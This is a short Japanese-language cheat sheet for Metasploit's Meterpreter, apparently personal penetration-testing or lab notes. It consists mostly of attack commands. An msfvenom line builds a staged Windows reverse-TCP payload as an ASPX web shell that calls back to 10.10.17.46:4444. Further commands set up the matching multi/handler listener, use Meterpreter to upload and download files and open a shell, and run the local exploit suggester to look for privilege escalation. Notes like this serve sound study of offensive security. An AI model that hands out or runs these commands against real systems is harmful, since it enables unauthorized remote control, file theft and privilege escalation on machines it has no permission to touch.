### Meterpreter

### reverseshellの作成
reverseshellをmeterpreterのstagedのもので作成する。次のhandlerと一致させないとだめ。
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.46 LPORT=4444 -f aspx -o rshell.aspx

### handlerの設定

    use exploit/multi/handler
    set lhost xxx.xxx.xxx.xxx
    set lport xxx.xxx.xxx.xxx
    set payload windows/meterpreter/reverse_tcp
    exploit -j

##基本情報取得  
`sysinfo`  
`getuid`  

## アップロード
`upload <元ファイル> <宛先>`  

## ダウンロード  
`download <元ファイル> <宛先>`  

## shellの実行
`shell`

## exploit suggester

まずは、セッションをバックグラウンドに移してからセッションを指定して実行。

    meterpreter > bg
    msf6 exploit(multi/handler) > search suggester

    Matching Modules
    ================

      #  Name                                      Disclosure Date  Rank    Check  Description
      -  ----                                      ---------------  ----    -----  -----------
      0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

      msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
      msf6 post(multi/recon/local_exploit_suggester) > set session 5
      session => 5
      msf6 post(multi/recon/local_exploit_suggester) > run
